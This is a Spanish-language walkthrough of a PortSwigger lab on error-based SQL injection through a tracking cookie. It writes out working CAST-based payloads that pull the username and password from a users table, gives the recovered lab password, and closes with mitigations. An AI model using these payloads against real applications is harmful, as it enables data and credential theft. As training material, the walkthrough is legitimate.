---
title: "Inyección SQL visible basada en errores"
platform: "PortSwigger"
os: "Linux"
difficulty: "Medium"
ip: "10.10.10.XXX"
slug: "inyeccion-sql-visible-basada-en-errores"
author: "Z4k7"
date: "2026-03-12"
year: "2026"
status: "pwned"
tags:
  - "SQLI"
  - "Bypass"
  - "cookie"
  - "WAF"
techniques:
  - "SQLI"
  - "Bypass"
  - "cookie"
  - "WAF"
tools:
  - "Burpsuite"
flags_list:
  - label: "usuario"
    value: "administrator"
  - label: "usuario"
    value: "administrator"
  - label: "usuario"
    value: "huacecvuyw36jf575xuf"
summary: "La vulnerabilidad de SQL Injection (SQLi) ocurre cuando una aplicación no valida ni escapa correctamente las entradas del usuario antes de construir consultas SQL.   En este caso, el parámetro TrackingId dentro de una #cookie es concatenado directamente en la consulta, permitiendo manipulación maliciosa.   Los mensajes de error extensos revelan la estructura interna de la consulta y facilitan la explotación."
steps:

  - id: "exploit"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          Este laboratorio contiene una vulnerabilidad de inyección SQL. La aplicación utiliza una cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie enviada. No se devuelven los resultados de la consulta SQL.
          La base de datos contiene una tabla diferente llamada `users`, con columnas llamadas `username` y `password`Para resolver el laboratorio, encuentre una forma de filtrar la contraseña. `administrator`usuario, luego inicie sesión en su cuenta.

  - id: "recon"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Validamos por medio de burpsuite  la cookie que menciona el objetivo del laboratorio
      - kind: "code"
        lang: "SQL"
        code: |
          Cookie: TrackingId=Se9xRJXuLhqcoMr2;
      - kind: "note"
        text: |
          Enviamos la consulta al repiter para poder manipular la consulta si  aplicamos el `'--`
      - kind: "image"
        src: "assets/images/Inyección%20SQL%20visible%20basada%20en%20errores/file-20260312175723877.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          No permite saltar el error que requiere el laboratorio para poder aplicar la inyección de sqli
          Validando si enviamos solo la `'` permite saltar el error que nos permite consultar la inyección de sqli
      - kind: "code"
        lang: "SQL"
        code: |
          Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'Se9xRJXuLhqcoMr2''. Expected  char
      - kind: "note"
        text: |
          Podemos utilizar  `CAST()` para tratar de obtener información de la base de datos
      - kind: "image"
        src: "assets/images/Inyección%20SQL%20visible%20basada%20en%20errores/file-20260312180315536.jpg"
        caption: "'CAST((SELECT * FROM users) AS int)"
      - kind: "note"
        text: |
          como podemos validar al momento de enviar la consulta SQLI obtendremos  el error que requerimos para continuar con el proceso aplicamos la logica de comparación  `1 = 1`
          Enviamos el código de la inyección SQLI
      - kind: "code"
        lang: "SQL"
        code: |
          Unterminated string literal started at position 79 in SQL SELECT * FROM tracking WHERE id = '' AND 1 = CAST((SELECT * FROM users) AS int)'. Expected  char
      - kind: "note"
        text: |
          Como ya contamos con el nombre de la tabla podríamos consultar en este caso las instrucciones del laboratorio nos menciona que el nombre es `users`  y la fila seria username
          enviamos la siguiente consulta y obtendremos la confirmasion de que si exite un usuario en dicha tabla adicional se agrega la regla  de un `LIMIT` de una sola columna .
      - kind: "image"
        src: "assets/images/Inyección%20SQL%20visible%20basada%20en%20errores/file-20260312184754905.jpg"
        caption: "' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--"
      - kind: "code"
        lang: "SQL"
        code: |
          ' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
      - kind: "note"
        text: |
          Ya se confirma que el usuario seria administrator

  - id: "flag_01"
    type: "flag"
    flag_items:
      - label: "usuario"
        value: "administrator"

  - id: "flag_01_post"
    num: ""
    title: "Post Flag"
    content:
      - kind: "note"
        text: |
          Una vez ya confirmamos que contamos con dicho usuario realizamos la consulta para validar  el password.
      - kind: "image"
        src: "assets/images/Inyección%20SQL%20visible%20basada%20en%20errores/file-20260312185253898.jpg"
        caption: "' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--"

  - id: "flag_02"
    type: "flag"
    flag_items:
      - label: "usuario"
        value: "administrator"
      - label: "usuario"
        value: "huacecvuyw36jf575xuf"

  - id: "flag_02_post"
    num: ""
    title: "Post Flag"
    content:
      - kind: "note"
        text: |
          Validamos el inicio en la web y se confirma el estado ok
      - kind: "image"
        src: "assets/images/Inyección%20SQL%20visible%20basada%20en%20errores/file-20260312185522069.jpg"
        caption: "Evidencia técnica"

  - id: "step3"
    num: "03"
    title: "Informacion"
    content:
      - kind: "note"
        text: |
          Potencialmente, puede provocar mensajes de error que filtren datos confidenciales devueltos por su consulta maliciosa.
      - kind: "image"
        src: "assets/images/Inyección%20SQL%20visible%20basada%20en%20errores/file-20260312190320697.jpg"
        caption: "Evidencia técnica"

lessons:
  - 'Este laboratorio ejemplifica cómo un error visible puede convertirse en un vector de ataque completo.- En auditorías, siempre validar cookies y cabeceras HTTP como posibles puntos de inyección.'
  - 'Para exámenes y entrevistas, recordar que error-based SQLi depende de mensajes detallados del servidor.'
  - 'En entornos reales, la explotación puede escalar hacia dump completo de la base de datos si no existen controles de seguridad.'
mitigation:
  - 'Implementar prepared statements y consultas parametrizadas.- Sanitizar y validar entradas en cookies y parámetros.'
  - 'Configurar el servidor para no mostrar mensajes de error detallados.'
  - 'Monitorear patrones de inyección en logs y #WAF.'
---
